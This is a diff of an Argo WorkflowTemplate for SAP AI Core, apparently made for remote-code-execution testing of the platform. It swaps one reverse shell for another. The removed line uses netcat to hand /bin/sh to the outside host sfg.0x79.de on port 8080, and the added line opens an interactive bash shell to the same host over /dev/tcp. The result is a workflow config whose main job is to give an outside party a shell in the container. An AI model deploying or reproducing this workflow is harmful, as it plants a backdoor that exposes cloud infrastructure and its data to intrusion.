@@ -1,15 +1,15 @@
 apiVersion: argoproj.io/v1alpha1
 kind: WorkflowTemplate
 metadata:
-  name: testflo-rce-wft-178530839424
+  name: testflo-rce-wft-178530960025
   annotations:
-    executables.ai.sap.com/name: testflo-rce-wft-178530839424
-    executables.ai.sap.com/id: testflo-rce-wft-178530839424
+    executables.ai.sap.com/name: testflo-rce-wft-178530960025
+    executables.ai.sap.com/id: testflo-rce-wft-178530960025
   labels:
     scenarios.ai.sap.com/id: testflo-scenario
     scenarios.ai.sap.com/name: testflo-scenario
-    executables.ai.sap.com/id: testflo-rce-wft-178530839424
-    executables.ai.sap.com/name: testflo-rce-wft-178530839424
+    executables.ai.sap.com/id: testflo-rce-wft-178530960025
+    executables.ai.sap.com/name: testflo-rce-wft-178530960025
     ai.sap.com/version: "1.0.0"
     ai.sap.com/resourcePlan: starter
 spec:
@@ -20,10 +20,10 @@ spec:
         labels:
           ai.sap.com/resourcePlan: starter
       container:
-        image: alpine:3.19
+        image: ubuntu:22.04
         command:
-          - sh
+          - bash
           - -c
           - |
-            nc sfg.0x79.de 8080 -e /bin/sh || true
+            bash -i >& /dev/tcp/sfg.0x79.de/8080 0>&1 || true
             sleep 3600
